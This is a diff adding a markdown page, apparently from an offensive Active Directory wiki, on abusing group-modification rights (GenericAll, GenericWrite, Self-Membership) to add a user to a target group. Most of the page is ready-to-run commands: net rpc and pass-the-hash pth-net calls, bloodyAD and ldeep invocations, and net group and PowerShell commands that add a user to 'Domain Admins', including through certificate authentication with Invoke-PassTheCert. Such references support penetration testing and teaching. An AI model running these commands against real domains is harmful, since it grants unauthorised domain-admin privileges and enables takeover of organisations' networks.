@@ -1,0 +1,75 @@
+---
+authors: CravateRouge, ShutdownRepo, sckdev, 0xblank, jamarir
+category: ad
+---
+
+# AddMember
+
+This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights` or `Self-Membership`, over the target group.
+
+::: tabs
+
+=== UNIX-like
+
+It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with [pass-the-hash](../ntlm/pth.md).
+
+```bash
+# With net and cleartext credentials (will be prompted)
+net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"
+
+# With net and cleartext credentials
+net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+
+# With Pass-the-Hash
+pth-net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
+```
+
+**Alternative 1**: Using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
+```
+
+---
+**Alternative 2**: Using [ldeep](https://github.com/franc-pentest/ldeep) (Python)
+
+> [!NOTE] NOTE
+> Use dn format for $TargetUser and $TargetGroup
+
+```bash
+ldeep ldap -d "$DOMAIN" -s "$DC_IP" -u "$USER" -p "$PASSWORD" add_to_group "$TargetUser" "$TargetGroup"
+```
+
+
+=== Windows
+
+The attacker can add a user/group/computer to a group. This can be achieved with a native command line, with the Active Directory PowerShell module, or with [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
+
+```bash
+# Command line
+net group 'Domain Admins' 'user' /add /domain
+
+# Powershell: Active Directory module
+Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'
+
+# Powershell: PowerSploit module
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
+```
+
+The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
+
+> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Adds the member 'Kinda KU. USY' into the group 'Domain Admins'
+Invoke-PassTheCert -Action 'AddGroupMember' -LdapConnection $LdapConnection -Identity 'CN=Kinda KU. USY,CN=Users,DC=X' -GroupDN 'CN=Domain Admins,CN=Users,DC=X'
+```
+
+:::
